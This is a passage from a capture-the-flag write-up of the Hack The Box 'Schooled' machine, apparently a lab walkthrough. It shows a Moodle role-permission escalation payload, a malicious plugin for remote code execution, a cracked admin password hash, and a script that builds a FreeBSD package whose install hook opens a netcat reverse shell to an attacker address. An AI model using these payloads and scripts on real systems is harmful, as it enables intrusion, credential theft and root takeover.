1&enrol%2Fpaypal%3Aunenrolself=1&enrol%2Fself%3Aconfig=1&enrol%2Fself%3Aholdkey=1&enrol%2Fself%3Amanage=1&enrol%2Fself%3Aunenrol=1&enrol%2Fself%3Aunenrolself=1&gradeexport%2Fods%3Apublish=1&gradeexport%2Fods%3Aview=1&gradeexport%2Ftxt%3Apublish=1&gradeexport%2Ftxt%3Aview=1&gradeexport%2Fxls%3Apublish=1&gradeexport%2Fxls%3Aview=1&gradeexport%2Fxml%3Apublish=1&gradeexport%2Fxml%3Aview=1&gradeimport%2Fcsv%3Aview=1&gradeimport%2Fdirect%3Aview=1&gradeimport%2Fxml%3Apublish=1&gradeimport%2Fxml%3Aview=1&gradereport%2Fgrader%3Aview=1&gradereport%2Fhistory%3Aview=1&gradereport%2Foutcomes%3Aview=1&gradereport%2Foverview%3Aview=1&gradereport%2Fsingleview%3Aview=1&gradereport%2Fuser%3Aview=1&mod%2Fassign%3Aaddinstance=1&mod%2Fassignment%3Aaddinstance=1&mod%2Fbook%3Aaddinstance=1&mod%2Fchat%3Aaddinstance=1&mod%2Fchoice%3Aaddinstance=1&mod%2Fdata%3Aaddinstance=1&mod%2Ffeedback%3Aaddinstance=1&mod%2Ffolder%3Aaddinstance=1&mod%2Fforum%3Aaddinstance=1&mod%2Fglossary%3Aaddinstance=1&mod%2Fh5pactivity%3Aaddinstance=1&mod%2Fimscp%3Aaddinstance=1&mod%2Flabel%3Aaddinstance=1&mod%2Flesson%3Aaddinstance=1&mod%2Flti%3Aaddcoursetool=1&mod%2Flti%3Aaddinstance=1&mod%2Flti%3Aaddmanualinstance=1&mod%2Flti%3Aaddpreconfiguredinstance=1&mod%2Flti%3Arequesttooladd=1&mod%2Fpage%3Aaddinstance=1&mod%2Fquiz%3Aaddinstance=1&mod%2Fresource%3Aaddinstance=1&mod%2Fscorm%3Aaddinstance=1&mod%2Fsurvey%3Aaddinstance=1&mod%2Furl%3Aaddinstance=1&mod%2Fwiki%3Aaddinstance=1&mod%2Fworkshop%3Aaddinstance=1&moodle%2Fanalytics%3Alistinsights=1&moodle%2Fbackup%3Aanonymise=1&moodle%2Fbackup%3Abackupcourse=1&moodle%2Fbackup%3Abackupsection=1&moodle%2Fbackup%3Abackuptargetimport=1&moodle%2Fbackup%3Aconfigure=1&moodle%2Fbackup%3Adownloadfile=1&moodle%2Fbackup%3Auserinfo=1&moodle%2Fbadges%3Aawardbadge=1&moodle%2Fbadges%3Aconfigurecriteria=1&moodle%2Fbadges%3Aconfiguredetails=1&moodle%2Fbadges%3Aconfiguremessages=1&moodle%2Fbadges%3Acreatebadge=1&moodle%2Fbadges%3Adeletebadge=1&moodle%2Fbadges%3Aearnbadge=1&moodle%2Fbadges%3Arevokebadge=1&moodle%2Fbadges%3Aviewawarded=1&moodle%2Fbadges%3Aviewbadges=1&moodle%2Fcalendar%3Amanageentries=1&moodle%2Fcalendar%3Amanagegroupentries=1&moodle%2Fcalendar%3Amanageownentries=1&moodle%2Fcohort%3Aview=1&moodle%2Fcomment%3Adelete=1&moodle%2Fcomment%3Apost=1&moodle%2Fcomment%3Aview=1&moodle%2Fcompetency%3Acompetencygrade=1&moodle%2Fcompetency%3Acoursecompetencygradable=1&moodle%2Fcompetency%3Acoursecompetencymanage=1&moodle%2Fcompetency%3Acoursecompetencyview=1&moodle%2Fcontentbank%3Aaccess=1&moodle%2Fcontentbank%3Adeleteanycontent=1&moodle%2Fcontentbank%3Adeleteowncontent=1&moodle%2Fcontentbank%3Amanageanycontent=1&moodle%2Fcontentbank%3Amanageowncontent=1&moodle%2Fcontentbank%3Aupload=1&moodle%2Fcontentbank%3Auseeditor=1&moodle%2Fcourse%3Abulkmessaging=1&moodle%2Fcourse%3Achangecategory=1&moodle%2Fcourse%3Achangefullname=1&moodle%2Fcourse%3Achangeidnumber=1&moodle%2Fcourse%3Achangelockedcustomfields=1&moodle%2Fcourse%3Achangeshortname=1&moodle%2Fcourse%3Achangesummary=1&moodle%2Fcourse%3Acreategroupconversations=1&moodle%2Fcourse%3Adelete=1&moodle%2Fcourse%3Aenrolconfig=1&moodle%2Fcourse%3Aenrolreview=1&moodle%2Fcourse%3Aignorefilesizelimits=1&moodle%2Fcourse%3Aisincompletionreports=1&moodle%2Fcourse%3Amanagefiles=1&moodle%2Fcourse%3Amanagegroups=1&moodle%2Fcourse%3Amanagescales=1&moodle%2Fcourse%3Amarkcomplete=1&moodle%2Fcourse%3Amovesections=1&moodle%2Fcourse%3Aoverridecompletion=1&moodle%2Fcourse%3Arenameroles=1&moodle%2Fcourse%3Areset=1&moodle%2Fcourse%3Areviewotherusers=1&moodle%2Fcourse%3Asectionvisibility=1&moodle%2Fcourse%3Asetcurrentsection=1&moodle%2Fcourse%3Asetforcedlanguage=1&moodle%2Fcourse%3Atag=1&moodle%2Fcourse%3Aupdate=1&moodle%2Fcourse%3Auseremail=1&moodle%2Fcourse%3Aview=1&moodle%2Fcourse%3Aviewhiddencourses=1&moodle%2Fcourse%3Aviewhiddensections=1&moodle%2Fcourse%3Aviewhiddenuserfields=1&moodle%2Fcourse%3Aviewparticipants=1&moodle%2Fcourse%3Aviewscales=1&moodle%2Fcourse%3Aviewsuspendedusers=1&moodle%2Fcourse%3Avisibility=1&moodle%2Ffilter%3Amanage=1&moodle%2Fgrade%3Aedit=1&moodle%2Fgrade%3Aexport=1&moodle%2Fgrade%3Ahide=1&moodle%2Fgrade%3Aimport=1&moodle%2Fgrade%3Alock=1&moodle%2Fgrade%3Amanage=1&moodle%2Fgrade%3Amanagegradingforms=1&moodle%2Fgrade%3Amanageletters=1&moodle%2Fgrade%3Amanageoutcomes=1&moodle%2Fgrade%3Aunlock=1&moodle%2Fgrade%3Aview=1&moodle%2Fgrade%3Aviewall=1&moodle%2Fgrade%3Aviewhidden=1&moodle%2Fnotes%3Amanage=1&moodle%2Fnotes%3Aview=1&moodle%2Fquestion%3Aadd=1&moodle%2Fquestion%3Aeditall=1&moodle%2Fquestion%3Aeditmine=1&moodle%2Fquestion%3Aflag=1&moodle%2Fquestion%3Amanagecategory=1&moodle%2Fquestion%3Amoveall=1&moodle%2Fquestion%3Amovemine=1&moodle%2Fquestion%3Atagall=1&moodle%2Fquestion%3Atagmine=1&moodle%2Fquestion%3Auseall=1&moodle%2Fquestion%3Ausemine=1&moodle%2Fquestion%3Aviewall=1&moodle%2Fquestion%3Aviewmine=1&moodle%2Frating%3Arate=1&moodle%2Frating%3Aview=1&moodle%2Frating%3Aviewall=1&moodle%2Frating%3Aviewany=1&moodle%2Frestore%3Aconfigure=1&moodle%2Frestore%3Arestoreactivity=1&moodle%2Frestore%3Arestorecourse=1&moodle%2Frestore%3Arestoresection=1&moodle%2Frestore%3Arestoretargetimport=1&moodle%2Frestore%3Arolldates=1&moodle%2Frestore%3Auploadfile=1&moodle%2Frestore%3Auserinfo=1&moodle%2Frestore%3Aviewautomatedfilearea=1&moodle%2Frole%3Aassign=1&moodle%2Frole%3Aoverride=1&moodle%2Frole%3Areview=1&moodle%2Frole%3Asafeoverride=1&moodle%2Frole%3Aswitchroles=1&moodle%2Fsite%3Aviewreports=1&moodle%2Fuser%3Aloginas=1&moodle%2Fuser%3Aviewdetails=1&moodle%2Fuser%3Aviewhiddendetails=1&report%2Fcompletion%3Aview=1&report%2Flog%3Aview=1&report%2Flog%3Aviewtoday=1&report%2Floglive%3Aview=1&report%2Foutline%3Aview=1&report%2Foutline%3Aviewuserreport=1&report%2Fparticipation%3Aview=1&report%2Fprogress%3Aview=1&report%2Fstats%3Aview=1&repository%2Fcontentbank%3Aaccesscoursecontent=1&tool%2Fmonitor%3Amanagerules=1&tool%2Fmonitor%3Asubscribe=1&tool%2Frecyclebin%3Adeleteitems=1&tool%2Frecyclebin%3Arestoreitems=1&tool%2Frecyclebin%3Aviewitems=1&webservice%2Frest%3Ause=1&webservice%2Fsoap%3Ause=1&webservice%2Fxmlrpc%3Ause=1&atto%2Fh5p%3Aaddembed=1&atto%2Frecordrtc%3Arecordaudio=1&atto%2Frecordrtc%3Arecordvideo=1&booktool%2Fexportimscp%3Aexport=1&booktool%2Fimporthtml%3Aimport=1&booktool%2Fprint%3Aprint=1&forumreport%2Fsummary%3Aview=1&forumreport%2Fsummary%3Aviewall=1&mod%2Fassign%3Aeditothersubmission=1&mod%2Fassign%3Aexportownsubmission=1&mod%2Fassign%3Agrade=1&mod%2Fassign%3Agrantextension=1&mod%2Fassign%3Amanageallocations=1&mod%2Fassign%3Amanagegrades=1&mod%2Fassign%3Amanageoverrides=1&mod%2Fassign%3Areceivegradernotifications=1&mod%2Fassign%3Areleasegrades=1&mod%2Fassign%3Arevealidentities=1&mod%2Fassign%3Areviewgrades=1&mod%2Fassign%3Ashowhiddengrader=1&mod%2Fassign%3Asubmit=1&mod%2Fassign%3Aview=1&mod%2Fassign%3Aviewblinddetails=1&mod%2Fassign%3Aviewgrades=1&mod%2Fassignment%3Aexportownsubmission=1&mod%2Fassignment%3Agrade=1&mod%2Fassignment%3Asubmit=1&mod%2Fassignment%3Aview=1&mod%2Fbook%3Aedit=1&mod%2Fbook%3Aread=1&mod%2Fbook%3Aviewhiddenchapters=1&mod%2Fchat%3Achat=1&mod%2Fchat%3Adeletelog=1&mod%2Fchat%3Aexportparticipatedsession=1&mod%2Fchat%3Aexportsession=1&mod%2Fchat%3Areadlog=1&mod%2Fchat%3Aview=1&mod%2Fchoice%3Achoose=1&mod%2Fchoice%3Adeleteresponses=1&mod%2Fchoice%3Adownloadresponses=1&mod%2Fchoice%3Areadresponses=1&mod%2Fchoice%3Aview=1&mod%2Fdata%3Aapprove=1&mod%2Fdata%3Acomment=1&mod%2Fdata%3Aexportallentries=1&mod%2Fdata%3Aexportentry=1&mod%2Fdata%3Aexportownentry=1&mod%2Fdata%3Aexportuserinfo=1&mod%2Fdata%3Amanagecomments=1&mod%2Fdata%3Amanageentries=1&mod%2Fdata%3Amanagetemplates=1&mod%2Fdata%3Amanageuserpresets=1&mod%2Fdata%3Arate=1&mod%2Fdata%3Aview=1&mod%2Fdata%3Aviewallratings=1&mod%2Fdata%3Aviewalluserpresets=1&mod%2Fdata%3Aviewanyrating=1&mod%2Fdata%3Aviewentry=1&mod%2Fdata%3Aviewrating=1&mod%2Fdata%3Awriteentry=1&mod%2Ffeedback%3Acomplete=1&mod%2Ffeedback%3Acreateprivatetemplate=1&mod%2Ffeedback%3Acreatepublictemplate=1&mod%2Ffeedback%3Adeletesubmissions=1&mod%2Ffeedback%3Adeletetemplate=1&mod%2Ffeedback%3Aedititems=1&mod%2Ffeedback%3Amapcourse=1&mod%2Ffeedback%3Areceivemail=1&mod%2Ffeedback%3Aview=1&mod%2Ffeedback%3Aviewanalysepage=1&mod%2Ffeedback%3Aviewreports=1&mod%2Ffolder%3Amanagefiles=1&mod%2Ffolder%3Aview=1&mod%2Fforum%3Aaddnews=1&mod%2Fforum%3Aaddquestion=1&mod%2Fforum%3Aallowforcesubscribe=1&mod%2Fforum%3Acanoverridecutoff=1&mod%2Fforum%3Acanoverridediscussionlock=1&mod%2Fforum%3Acanposttomygroups=1&mod%2Fforum%3Acantogglefavourite=1&mod%2Fforum%3Acreateattachment=1&mod%2Fforum%3Adeleteanypost=1&mod%2Fforum%3Adeleteownpost=1&mod%2Fforum%3Aeditanypost=1&mod%2Fforum%3Aexportdiscussion=1&mod%2Fforum%3Aexportforum=1&mod%2Fforum%3Aexportownpost=1&mod%2Fforum%3Aexportpost=1&mod%2Fforum%3Agrade=1&mod%2Fforum%3Amanagesubscriptions=1&mod%2Fforum%3Amovediscussions=1&mod%2Fforum%3Apindiscussions=1&mod%2Fforum%3Apostprivatereply=1&mod%2Fforum%3Apostwithoutthrottling=1&mod%2Fforum%3Arate=1&mod%2Fforum%3Areadprivatereplies=1&mod%2Fforum%3Areplynews=1&mod%2Fforum%3Areplypost=1&mod%2Fforum%3Asplitdiscussions=1&mod%2Fforum%3Astartdiscussion=1&mod%2Fforum%3Aviewallratings=1&mod%2Fforum%3Aviewanyrating=1&mod%2Fforum%3Aviewdiscussion=1&mod%2Fforum%3Aviewhiddentimedposts=1&mod%2Fforum%3Aviewqandawithoutposting=1&mod%2Fforum%3Aviewrating=1&mod%2Fforum%3Aviewsubscribers=1&mod%2Fglossary%3Aapprove=1&mod%2Fglossary%3Acomment=1&mod%2Fglossary%3Aexport=1&mod%2Fglossary%3Aexportentry=1&mod%2Fglossary%3Aexportownentry=1&mod%2Fglossary%3Aimport=1&mod%2Fglossary%3Amanagecategories=1&mod%2Fglossary%3Amanagecomments=1&mod%2Fglossary%3Amanageentries=1&mod%2Fglossary%3Arate=1&mod%2Fglossary%3Aview=1&mod%2Fglossary%3Aviewallratings=1&mod%2Fglossary%3Aviewanyrating=1&mod%2Fglossary%3Aviewrating=1&mod%2Fglossary%3Awrite=1&mod%2Fh5pactivity%3Areviewattempts=1&mod%2Fh5pactivity%3Asubmit=1&mod%2Fh5pactivity%3Aview=1&mod%2Fimscp%3Aview=1&mod%2Flabel%3Aview=1&mod%2Flesson%3Aedit=1&mod%2Flesson%3Agrade=1&mod%2Flesson%3Amanage=1&mod%2Flesson%3Amanageoverrides=1&mod%2Flesson%3Aview=1&mod%2Flesson%3Aviewreports=1&mod%2Flti%3Aadmin=1&mod%2Flti%3Amanage=1&mod%2Flti%3Aview=1&mod%2Fpage%3Aview=1&mod%2Fquiz%3Aattempt=1&mod%2Fquiz%3Adeleteattempts=1&mod%2Fquiz%3Aemailconfirmsubmission=1&mod%2Fquiz%3Aemailnotifysubmission=1&mod%2Fquiz%3Aemailwarnoverdue=1&mod%2Fquiz%3Agrade=1&mod%2Fquiz%3Aignoretimelimits=1&mod%2Fquiz%3Amanage=1&mod%2Fquiz%3Amanageoverrides=1&mod%2Fquiz%3Apreview=1&mod%2Fquiz%3Aregrade=1&mod%2Fquiz%3Areviewmyattempts=1&mod%2Fquiz%3Aview=1&mod%2Fquiz%3Aviewreports=1&mod%2Fresource%3Aview=1&mod%2Fscorm%3Adeleteownresponses=1&mod%2Fscorm%3Adeleteresponses=1&mod%2Fscorm%3Asavetrack=1&mod%2Fscorm%3Askipview=1&mod%2Fscorm%3Aviewreport=1&mod%2Fscorm%3Aviewscores=1&mod%2Fsurvey%3Adownload=1&mod%2Fsurvey%3Aparticipate=1&mod%2Fsurvey%3Areadresponses=1&mod%2Furl%3Aview=1&mod%2Fwiki%3Acreatepage=1&mod%2Fwiki%3Aeditcomment=1&mod%2Fwiki%3Aeditpage=1&mod%2Fwiki%3Amanagecomment=1&mod%2Fwiki%3Amanagefiles=1&mod%2Fwiki%3Amanagewiki=1&mod%2Fwiki%3Aoverridelock=1&mod%2Fwiki%3Aviewcomment=1&mod%2Fwiki%3Aviewpage=1&mod%2Fworkshop%3Aallocate=1&mod%2Fworkshop%3Adeletesubmissions=1&mod%2Fworkshop%3Aeditdimensions=1&mod%2Fworkshop%3Aexportsubmissions=1&mod%2Fworkshop%3Aignoredeadlines=1&mod%2Fworkshop%3Amanageexamples=1&mod%2Fworkshop%3Aoverridegrades=1&mod%2Fworkshop%3Apeerassess=1&mod%2Fworkshop%3Apublishsubmissions=1&mod%2Fworkshop%3Asubmit=1&mod%2Fworkshop%3Aswitchphase=1&mod%2Fworkshop%3Aview=1&mod%2Fworkshop%3Aviewallassessments=1&mod%2Fworkshop%3Aviewallsubmissions=1&mod%2Fworkshop%3Aviewauthornames=1&mod%2Fworkshop%3Aviewauthorpublished=1&mod%2Fworkshop%3Aviewpublishedsubmissions=1&mod%2Fworkshop%3Aviewreviewernames=1&moodle%2Fbackup%3Abackupactivity=1&moodle%2Fcompetency%3Acoursecompetencyconfigure=1&moodle%2Fcourse%3Aactivityvisibility=1&moodle%2Fcourse%3Aignoreavailabilityrestrictions=1&moodle%2Fcourse%3Amanageactivities=1&moodle%2Fcourse%3Atogglecompletion=1&moodle%2Fcourse%3Aviewhiddenactivities=1&moodle%2Fh5p%3Adeploy=1&moodle%2Fh5p%3Asetdisplayoptions=1&moodle%2Fh5p%3Aupdatelibraries=1&moodle%2Fsite%3Aaccessallgroups=1&moodle%2Fsite%3Amanagecontextlocks=1&moodle%2Fsite%3Atrustcontent=1&moodle%2Fsite%3Aviewanonymousevents=1&moodle%2Fsite%3Aviewfullnames=1&moodle%2Fsite%3Aviewuseridentity=1&quiz%2Fgrading%3Aviewidnumber=1&quiz%2Fgrading%3Aviewstudentnames=1&quiz%2Fstatistics%3Aview=1&quizaccess%2Fseb%3Abypassseb=1&quizaccess%2Fseb%3Amanage_filemanager_sebconfigfile=1&quizaccess%2Fseb%3Amanage_seb_activateurlfiltering=1&quizaccess%2Fseb%3Amanage_seb_allowedbrowserexamkeys=1&quizaccess%2Fseb%3Amanage_seb_allowreloadinexam=1&quizaccess%2Fseb%3Amanage_seb_allowspellchecking=1&quizaccess%2Fseb%3Amanage_seb_allowuserquitseb=1&quizaccess%2Fseb%3Amanage_seb_enableaudiocontrol=1&quizaccess%2Fseb%3Amanage_seb_expressionsallowed=1&quizaccess%2Fseb%3Amanage_seb_expressionsblocked=1&quizaccess%2Fseb%3Amanage_seb_filterembeddedcontent=1&quizaccess%2Fseb%3Amanage_seb_linkquitseb=1&quizaccess%2Fseb%3Amanage_seb_muteonstartup=1&quizaccess%2Fseb%3Amanage_seb_quitpassword=1&quizaccess%2Fseb%3Amanage_seb_regexallowed=1&quizaccess%2Fseb%3Amanage_seb_regexblocked=1&quizaccess%2Fseb%3Amanage_seb_requiresafeexambrowser=1&quizaccess%2Fseb%3Amanage_seb_showkeyboardlayout=1&quizaccess%2Fseb%3Amanage_seb_showreloadbutton=1&quizaccess%2Fseb%3Amanage_seb_showsebdownloadlink=1&quizaccess%2Fseb%3Amanage_seb_showsebtaskbar=1&quizaccess%2Fseb%3Amanage_seb_showtime=1&quizaccess%2Fseb%3Amanage_seb_showwificontrol=1&quizaccess%2Fseb%3Amanage_seb_templateid=1&quizaccess%2Fseb%3Amanage_seb_userconfirmquit=1&repository%2Fareafiles%3Aview=1&repository%2Fboxnet%3Aview=1&repository%2Fcontentbank%3Aview=1&repository%2Fcoursefiles%3Aview=1&repository%2Fdropbox%3Aview=1&repository%2Fequella%3Aview=1&repository%2Ffilesystem%3Aview=1&repository%2Fflickr%3Aview=1&repository%2Fflickr_public%3Aview=1&repository%2Fgoogledocs%3Aview=1&repository%2Flocal%3Aview=1&repository%2Fmerlot%3Aview=0&repository%2Fnextcloud%3Aview=1&repository%2Fonedrive%3Aview=1&repository%2Fpicasa%3Aview=1&repository%2Frecent%3Aview=1&repository%2Fs3%3Aview=1&repository%2Fskydrive%3Aview=1&repository%2Fupload%3Aview=1&repository%2Furl%3Aview=1&repository%2Fuser%3Aview=1&repository%2Fwebdav%3Aview=1&repository%2Fwikimedia%3Aview=1&repository%2Fyoutube%3Aview=1&block%2Factivity_modules%3Aaddinstance=1&block%2Factivity_results%3Aaddinstance=1&block%2Fadmin_bookmarks%3Aaddinstance=1&block%2Fbadges%3Aaddinstance=1&block%2Fblog_menu%3Aaddinstance=1&block%2Fblog_recent%3Aaddinstance=1&block%2Fblog_tags%3Aaddinstance=1&block%2Fcalendar_month%3Aaddinstance=1&block%2Fcalendar_upcoming%3Aaddinstance=1&block%2Fcomments%3Aaddinstance=1&block%2Fcompletionstatus%3Aaddinstance=1&block%2Fcourse_list%3Aaddinstance=1&block%2Fcourse_summary%3Aaddinstance=1&block%2Ffeedback%3Aaddinstance=1&block%2Fglobalsearch%3Aaddinstance=1&block%2Fglossary_random%3Aaddinstance=1&block%2Fhtml%3Aaddinstance=1&block%2Flogin%3Aaddinstance=1&block%2Fmentees%3Aaddinstance=1&block%2Fmnet_hosts%3Aaddinstance=1&block%2Fmyprofile%3Aaddinstance=1&block%2Fnavigation%3Aaddinstance=1&block%2Fnews_items%3Aaddinstance=1&block%2Fonline_users%3Aaddinstance=1&block%2Fonline_users%3Aviewlist=1&block%2Fprivate_files%3Aaddinstance=1&block%2Fquiz_results%3Aaddinstance=1&block%2Frecent_activity%3Aaddinstance=1&block%2Frss_client%3Aaddinstance=1&block%2Frss_client%3Amanageanyfeeds=1&block%2Frss_client%3Amanageownfeeds=1&block%2Fsearch_forums%3Aaddinstance=1&block%2Fsection_links%3Aaddinstance=1&block%2Fselfcompletion%3Aaddinstance=1&block%2Fsettings%3Aaddinstance=1&block%2Fsite_main_menu%3Aaddinstance=1&block%2Fsocial_activities%3Aaddinstance=1&block%2Ftag_flickr%3Aaddinstance=1&block%2Ftag_youtube%3Aaddinstance=1&block%2Ftags%3Aaddinstance=1&moodle%2Fblock%3Aedit=1&moodle%2Fblock%3Aview=1&moodle%2Fsite%3Amanageblocks=1&savechanges=Save+changes
```

payload:

Paste in the intercepted request in burp

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1919.jpg)

Forward the request

Upload Payload to get shell

Now its time to get reverse shell

RCE can be achieved by uploading into plugin section and calling the Plugin from browser to get shell

Lets begin

#### get shell

Upload Plugin

Location of Plugin

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1920.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1921.jpg)

Malicious Plugin can be downloaded from [Moodle_RCE](https://github.com/HoangKien1020/Moodle_RCE)

unzip it and put [php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

change the IP and PORT

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1922.jpg)

Upload the plugin

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1923.jpg)

and start a listen on netcat

and start a listen on netcat

RCE Intial Shell

#### Trigger RCE

``` bash
domain/blocks/rce/lang/en/block_rce.php?cmd=id*
```

we got shell 

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1924.jpg)

Mysql Creds

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1925.jpg)

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1926.jpg)

Jamie(admin) Hash 

``` bash
$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
```

crack via john

``` bash
john hash -w=/usr/share/wordlists/rockyou.txt
```

already cracked it take few minutes depend on your pc
So Jamie password is '!QAZ2wsx'

``` bash
jamie@Schooled:~ $ id
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
jamie@Schooled:~ $ whoami
jamie
jamie@Schooled:~ $ cat user.txt
39a50aff4788e4486058408e4ab91bd1
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1927.jpg)

#### privilege esclation

``` bash
jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
```

Here is the some reference for privilleged escalation 

 - [Creating Custom Packages on FreeBSD](http://lastsummer.de/creating-custom-packages-on-freebsd/)


Here is the script for root

 - exp.sh

``` bash
#!/bin/sh
STAGEDIR=/tmp/package
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}
cat >> ${STAGEDIR}/+PRE_INSTALL <<EOF
# careful here, this may clobber your system
echo “Resetting root shell”
rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc 10.10.14.7 9080 >/tmp/a
EOF
cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
# careful here, this may clobber your system
echo “Registering root shell”
pw usermod -n root -s /bin/sh
EOF
cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version: “1.0_5”
origin: sysutils/mypackage
comment: “automates stuff”
desc: “automates tasks which can also be undone later”
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF
pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
```

Run the script on victim (jamie) machine,  run this command

and we got root

``` bash
jamie@Schooled:~ $ chmod +x exploit.sh 
jamie@Schooled:~ $ ./exploit.sh 
jamie@Schooled:~ $ ls
exploit.sh                      mypackage-“1.0_5”.txz           user.txt
jamie@Schooled:~ $ sudo pkg install --no-repo-update *.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        mypackage: “1.0_5”

Number of packages to be installed: 1

Proceed with this action? [y/N]: y
[1/1] Installing mypackage-“1.0_5”...
“Resetting root shell”
rm: /tmp/a: No such file or directory
```

``` bash
┌──(root💀kali)-[~/hackthebox/machine/schooled]
└─# nc -lvp 9080
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::9080
Ncat: Listening on 0.0.0.0:9080
Ncat: Connection from 10.10.10.234.
Ncat: Connection from 10.10.10.234:38734.
# id
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
# whoami
root
# cat /root/root.txt
58c6281b0eddaff94df2d1e96b6e2520
#
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1928.jpg)


#### Summary of knowledge

 - use ffuf to bruteforce subdomains
 - reflect xss to get teacher's cookie
 - CVE-2020-14321 RCE to get a reverse shell
 - Creating Custom Packages on FreeBSD to privilleged escalation

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end schooled -->

</details>

